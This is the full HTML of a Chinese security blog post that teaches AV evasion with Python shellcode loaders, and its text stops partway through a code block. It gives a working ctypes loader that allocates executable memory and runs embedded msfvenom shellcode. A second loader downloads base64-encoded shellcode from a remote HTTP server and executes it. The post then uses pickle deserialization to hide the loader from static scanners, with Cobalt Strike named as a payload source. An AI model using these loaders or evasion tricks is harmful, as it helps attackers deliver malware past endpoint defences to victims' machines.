@@ -1,0 +1,1282 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="google-site-verification" content="ZsntNucQnwgOG8NJsPVjhDxi8hx9YmTvgqa9eReuux0" />
+
+
+
+  <meta name="msvalidate.01" content="A3C088EA1884107284C9F5B94B1C667F" />
+
+
+
+
+
+
+  <meta name="baidu-site-verification" content="rLNDlRl5mo" />
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/avatar.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/avatar.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/avatar.jpg?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/avatar.jpg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Python," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="原理12345678910免杀技术大致分为有以下几类：特征码修改花指令免杀加壳免杀内存免杀二次编译分离免杀资源修改...Ps: 不管使用哪种技术，能绕过AV(AntiVirus)达到效果的，都是好的。  采用分离免杀，即利用ShellCode和Python制作的加载器进行分离。 主要将ShellCode进行编码，分离及反序列化达到bypass的思路和方法。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Python Shellcode加载器绕过AV">
+<meta property="og:url" content="https://scriptkid-beta.github.io/2020/12/07/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/index.html">
+<meta property="og:site_name" content="小维的博客">
+<meta property="og:description" content="原理12345678910免杀技术大致分为有以下几类：特征码修改花指令免杀加壳免杀内存免杀二次编译分离免杀资源修改...Ps: 不管使用哪种技术，能绕过AV(AntiVirus)达到效果的，都是好的。  采用分离免杀，即利用ShellCode和Python制作的加载器进行分离。 主要将ShellCode进行编码，分离及反序列化达到bypass的思路和方法。">
+<meta property="og:image" content="https://scriptkid-beta.github.io/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201205145223046.png">
+<meta property="og:image" content="https://scriptkid-beta.github.io/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201204183555152.png">
+<meta property="og:image" content="https://scriptkid-beta.github.io/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201204181858175.png">
+<meta property="og:image" content="https://scriptkid-beta.github.io/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201204182834063.png">
+<meta property="og:image" content="https://scriptkid-beta.github.io/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201205105822973.png">
+<meta property="og:image" content="https://scriptkid-beta.github.io/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201204233028982.png">
+<meta property="og:image" content="https://scriptkid-beta.github.io/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201205155425112.png">
+<meta property="og:image" content="https://scriptkid-beta.github.io/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201205155553287.png">
+<meta property="og:image" content="https://scriptkid-beta.github.io/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-202012051534357041.png">
+<meta property="og:image" content="https://scriptkid-beta.github.io/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201205154002722.png">
+<meta property="og:image" content="https://scriptkid-beta.github.io/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201205154952238.png">
+<meta property="og:image" content="https://scriptkid-beta.github.io/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201205154735442.png">
+<meta property="og:image" content="https://scriptkid-beta.github.io/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201205155120792.png">
+<meta property="og:image" content="https://scriptkid-beta.github.io/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201205224811833.png">
+<meta property="og:image" content="https://scriptkid-beta.github.io/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201207153229920.png">
+<meta property="og:image" content="https://scriptkid-beta.github.io/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201207144921636.png">
+<meta property="og:image" content="https://scriptkid-beta.github.io/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201207163850250.png">
+<meta property="og:image" content="https://scriptkid-beta.github.io/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201207150048052.png">
+<meta property="og:image" content="https://scriptkid-beta.github.io/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201207150125561.png">
+<meta property="article:published_time" content="2020-12-07T10:22:58.000Z">
+<meta property="article:modified_time" content="2020-12-30T02:27:45.426Z">
+<meta property="article:author" content="小维同学">
+<meta property="article:tag" content="Python">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://scriptkid-beta.github.io/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201205145223046.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":10,"b2t":true,"scrollpercent":true,"onmobile":true},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://scriptkid-beta.github.io/2020/12/07/Python Shellcode加载器绕过AV/"/>
+
+
+
+
+
+  <title>Python Shellcode加载器绕过AV | 小维的博客</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">小维的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Python | CTF | Pentest | Note | Security</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-小维的安全导航">
+          <a href="/StartPages/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
+            
+            小维的安全导航
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://scriptkid-beta.github.io/2020/12/07/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="小维同学">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小维的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Python Shellcode加载器绕过AV</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-12-07T18:22:58+08:00">
+                2020-12-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1.9k字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  8分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">免杀技术大致分为有以下几类：</span><br><span class="line">特征码修改</span><br><span class="line">花指令免杀</span><br><span class="line">加壳免杀</span><br><span class="line">内存免杀</span><br><span class="line">二次编译</span><br><span class="line">分离免杀</span><br><span class="line">资源修改</span><br><span class="line">...</span><br><span class="line">Ps: 不管使用哪种技术，能绕过AV(AntiVirus)达到效果的，都是好的。</span><br></pre></td></tr></table></figure>
+
+<p>采用分离免杀，即利用ShellCode和Python制作的加载器进行分离。</p>
+<p>主要将ShellCode进行编码，分离及反序列化达到bypass的思路和方法。</p>
+<a id="more"></a>
+
+<h4 id="ShellCode"><a href="#ShellCode" class="headerlink" title="ShellCode"></a>ShellCode</h4><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">什么是<span class="keyword">ShellCode?</span></span><br><span class="line"><span class="keyword">答：一段用于利用软件漏洞而执行的代码</span></span><br></pre></td></tr></table></figure>
+
+<p>这里我们利用Cobalt Strike生成的ShellCode</p>
+<p><img src="/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201205145223046.png" alt="image-20201205145223046"></p>
+<h4 id="ShellCode加载器"><a href="#ShellCode加载器" class="headerlink" title="ShellCode加载器"></a>ShellCode加载器</h4><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">什么是<span class="keyword">ShellCode加载器？</span></span><br><span class="line"><span class="keyword">答：即专门用于加载所提供ShellCode的工具。</span></span><br></pre></td></tr></table></figure>
+
+<p>以Python为例：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line"><span class="comment"># "msfvenom -p windows/x64/exec CMD=calc.exe -f python"生成的计算器的ShellCode</span></span><br><span class="line">shellcode =  <span class="string">b"\xfcH\x83\xe4\xf0\xe8\xc0\x00\x00\x00AQAPRQVH1\xd2eH\x8bR`H\x8bR\x18H\x8bR H\x8brPH\x0f\xb7JJM1\xc9H1\xc0\xac&lt;a|\x02, A\xc1\xc9\rA\x01\xc1\xe2\xedRAQH\x8bR \x8bB&lt;H\x01\xd0\x8b\x80\x88\x00\x00\x00H\x85\xc0tgH\x01\xd0P\x8bH\x18D\x8b@ I\x01\xd0\xe3VH\xff\xc9A\x8b4\x88H\x01\xd6M1\xc9H1\xc0\xacA\xc1\xc9\rA\x01\xc18\xe0u\xf1L\x03L$\x08E9\xd1u\xd8XD\x8b@$I\x01\xd0fA\x8b\x0cHD\x8b@\x1cI\x01\xd0A\x8b\x04\x88H\x01\xd0AXAX^YZAXAYAZH\x83\xec AR\xff\xe0XAYZH\x8b\x12\xe9W\xff\xff\xff]H\xba\x01\x00\x00\x00\x00\x00\x00\x00H\x8d\x8d\x01\x01\x00\x00A\xba1\x8bo\x87\xff\xd5\xbb\xf0\xb5\xa2VA\xba\xa6\x95\xbd\x9d\xff\xd5H\x83\xc4(&lt;\x06|\n\x80\xfb\xe0u\x05\xbbG\x13roj\x00YA\x89\xda\xff\xd5calc.exe\x00"</span></span><br><span class="line"> </span><br><span class="line">shellcode = bytearray(shellcode)</span><br><span class="line"><span class="comment"># 设置VirtualAlloc返回类型为ctypes.c_uint64</span></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line"><span class="comment"># 申请内存</span></span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(len(shellcode)), ctypes.c_int(<span class="number">0x3000</span>), ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 放入shellcode</span></span><br><span class="line">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="line">    ctypes.c_uint64(ptr), </span><br><span class="line">    buf, </span><br><span class="line">    ctypes.c_int(len(shellcode))</span><br><span class="line">)</span><br><span class="line"><span class="comment"># 创建一个线程从shellcode防止位置首地址开始执行</span></span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">    ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">    ctypes.c_uint64(ptr), </span><br><span class="line">    ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">    ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">    ctypes.pointer(ctypes.c_int(<span class="number">0</span>))</span><br><span class="line">)</span><br><span class="line"><span class="comment"># 等待上面创建的线程运行完</span></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(<span class="number">-1</span>))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201204183555152.png" alt="image-20201204183555152"></p>
+<h4 id="分离"><a href="#分离" class="headerlink" title="分离"></a>分离</h4><p>这里通过本地请求Http Server获取ShellCode内容并进行加载执行。</p>
+<p>将ShellCode放置VPS上，这里利用Python起一个临时的http服务。</p>
+<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.<span class="keyword">server</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201204181858175.png" alt="image-20201204181858175"></p>
+<p>通过request请求来获取ShellCode进行加载执行从而实现分离。</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">shellcode</span> = urllib.request.urlopen(<span class="string">'http://192.168.1.1:8000/test.txt'</span>).read()</span><br></pre></td></tr></table></figure>
+
+<h4 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h4><p>我么可以对ShellCode进行混淆编码加密等，再有本地可执行程序进行解密执行，这里我们以Base64编码处理为例，处理过后ShellCode页面如下。</p>
+<p><img src="/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201204182834063.png" alt="image-20201204182834063"></p>
+<h4 id="下载ShellCode并执行"><a href="#下载ShellCode并执行" class="headerlink" title="下载ShellCode并执行"></a>下载ShellCode并执行</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes,urllib.request,codecs,base64</span><br><span class="line"></span><br><span class="line">shellcode = urllib.request.urlopen(<span class="string">'http://192.168.1.1:8000/test.txt'</span>).read()  <span class="comment"># 请求pyload（base64格式）</span></span><br><span class="line">shellcode = base64.b64decode(shellcode) <span class="comment"># base64解密</span></span><br><span class="line">shellcode =codecs.escape_decode(shellcode)[<span class="number">0</span>] <span class="comment"># </span></span><br><span class="line">shellcode = bytearray(shellcode) <span class="comment"># 返回新字节数组</span></span><br><span class="line"><span class="comment"># 设置VirtualAlloc返回类型为ctypes.c_uint64</span></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line"><span class="comment"># 申请内存</span></span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(len(shellcode)), ctypes.c_int(<span class="number">0x3000</span>), ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 放入shellcode</span></span><br><span class="line">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="line">    ctypes.c_uint64(ptr), </span><br><span class="line">    buf, </span><br><span class="line">    ctypes.c_int(len(shellcode))</span><br><span class="line">)</span><br><span class="line"><span class="comment"># 创建一个线程从shellcode防止位置首地址开始执行</span></span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">    ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">    ctypes.c_uint64(ptr), </span><br><span class="line">    ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">    ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">    ctypes.pointer(ctypes.c_int(<span class="number">0</span>))</span><br><span class="line">)</span><br><span class="line"><span class="comment"># 等待上面创建的线程运行完</span></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(<span class="number">-1</span>))</span><br></pre></td></tr></table></figure>
+
+<h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p>经过了上文的那些操作，使用<code>pyinstaller</code>将我们的程序打包成可执行程序，仍然会给杀软进行查杀。</p>
+<p><img src="/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201205105822973.png" alt="image-20201205105822973"></p>
+<p>因为我们使用的加载器本身关键语句已经被检测，因此我们需要对其进行进一步处理从而绕过静态查杀，我们绕过的方式可以通过上文说过的混淆、编码、加密等方式对代码进行处理，然后进行调用执行。但是像执行命令的<code>exec</code>、<code>eval</code>等函数特征比较明显，所以我们对它也需要进一步处理。</p>
+<p>跟其他语言一样，Python也有序列化的功能，官方库里提供了pickle/cPickle的库用于序列化和反序列化，可以序列化python的任何数据结构，包括一个类，一个对象。</p>
+<p>Python反序列化中 ，有几个内置方法会在对象反序列化时调用，这一点和PHP中的<code>__wakeup()</code>魔术方法类似，都是因为每当反序列化过程开始或者结束时 , 都会自动调用这类函数。（这一点可以去了解一下：python中的反序列化安全问题）</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__reduce__<span class="comment">()</span>  </span><br><span class="line">__reduce_ex__<span class="comment">()</span> </span><br><span class="line">__setstate__<span class="comment">()</span></span><br><span class="line">可参考官方文档：https:<span class="comment">//docs.python.org/zh-cn/dev/library/pickle.html</span></span><br></pre></td></tr></table></figure>
+
+<p>以<code>__reduce__()</code>为例：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span><span class="params">(object)</span>:</span></span><br><span class="line">    a = <span class="number">1</span></span><br><span class="line">    b = <span class="number">2</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">print</span>, (self.a+self.b,))</span><br><span class="line"></span><br><span class="line">serialize = pickle.dumps(A()) <span class="comment"># 序列化</span></span><br><span class="line">print(serialize)</span><br><span class="line"></span><br><span class="line">unserialize = pickle.loads(serialize) <span class="comment"># 反序列化</span></span><br></pre></td></tr></table></figure>
+
+<p>通过<code>pickle</code>的<code>loads</code>来反序列化并自动执行了</p>
+<p><img src="/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201204233028982.png" alt="image-20201204233028982"></p>
+<p>从输出的结果我们还是可以看到调用的关键函数名称，可以对其进行混淆、编码、加密等操作，这里以<code>Base64</code>编码为例，序列化、编码，解码、反序列化代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span><span class="params">(object)</span>:</span></span><br><span class="line">    a = <span class="number">1</span></span><br><span class="line">    b = <span class="number">2</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">print</span>, (self.a+self.b,))</span><br><span class="line"></span><br><span class="line">serialize = pickle.dumps(A()) <span class="comment"># 序列化</span></span><br><span class="line">print(serialize)</span><br><span class="line">print(<span class="string">"========分割线==========="</span>)</span><br><span class="line">serialize_encode = base64.b64encode(serialize) <span class="comment">#进行base64编码</span></span><br><span class="line">print(serialize_encode)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201205155425112.png" alt="image-20201205155425112"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">serialize_encode = <span class="string">b'gASVHAAAAAAAAACMCGJ1aWx0aW5zlIwFcHJpbnSUk5RLA4WUUpQu'</span></span><br><span class="line">serialize_decode = base64.b64decode(serialize_encode)</span><br><span class="line">unserialize = pickle.loads(serialize_decode) <span class="comment"># 反序列化</span></span><br></pre></td></tr></table></figure>
+
+<p>从代码层面来看，看到的是一段正常的base64编码以及反序列化的脚本文件，达到bypass的效果。</p>
+<p><img src="/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201205155553287.png" alt="image-20201205155553287"></p>
+<h4 id="反序列化应用"><a href="#反序列化应用" class="headerlink" title="反序列化应用"></a>反序列化应用</h4><p>结合上述说的利用反序列化来进行对我们的ShellCode加载来处理：</p>
+<p>先进行序列化操作并进行base64编码,得到base64编码后的序列化：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes,urllib.request,codecs,base64,pickle</span><br><span class="line"></span><br><span 